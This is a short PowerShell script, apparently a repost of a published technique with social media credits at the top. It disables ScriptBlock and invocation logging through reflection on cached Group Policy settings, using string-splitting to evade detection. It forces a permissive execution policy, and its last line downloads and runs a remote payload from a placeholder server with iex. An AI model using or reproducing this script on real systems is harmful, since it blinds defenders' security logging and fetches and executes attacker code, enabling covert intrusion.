#######################################
# ( Twitter)                          #
# https://twitter.com/cobbr_io        #
#######################################
# (Site)                              #
# https://cobbr.io/                   #
#######################################

########################################################
# ( Twitter )                                          #
# https://www.Twitter.com/GihadAlkmaty                 #
########################################################
# ( Facebook )                                         #
# https://www.facebook.com/GihadAlkmatySy              #
########################################################
# ( Github )                                           #
# https://www.Github.com/jihadLkmaty218                #
########################################################
# ScriptBlock Logging Bypass
# @cobbr_io
# @Homjxie
############

Set-ExecutionPolicy RemoteSigned -Scope Process -Force # bypass disable Script ps1
$GroupPolicySettings = [ref].Assembly.GetType('System.Management.Automation.Utils')."GetFie`ld"('cachedGroupPolicySettings', 'N'+'onPublic,Static').GetValue($null)
$GroupPolicySettings['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging'] = 0
$GroupPolicySettings['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging'] = 0
iex (New-Object Net.WebClient).downloadstring("https://myserver/mypayload.ps1")